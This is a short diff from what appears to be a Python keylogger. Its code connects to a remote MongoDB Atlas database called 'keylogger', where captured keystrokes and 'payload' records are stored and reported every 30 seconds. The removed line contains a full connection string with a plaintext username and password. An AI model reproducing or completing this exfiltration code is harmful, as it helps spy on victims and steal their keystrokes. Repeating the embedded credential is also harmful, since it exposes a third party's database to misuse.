@@ -24,7 +24,7 @@ SEND_REPORT_EVERY = 30  # as in seconds
 
 # <--MongoDB Connection-->
 try:
-    client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
+    client = pymongo.MongoClient("<mongoDB Atlas connection string>")
     db = client["keylogger"]
     keylogs_collection = db["keylog"]
     payload_collection = db["payload"]
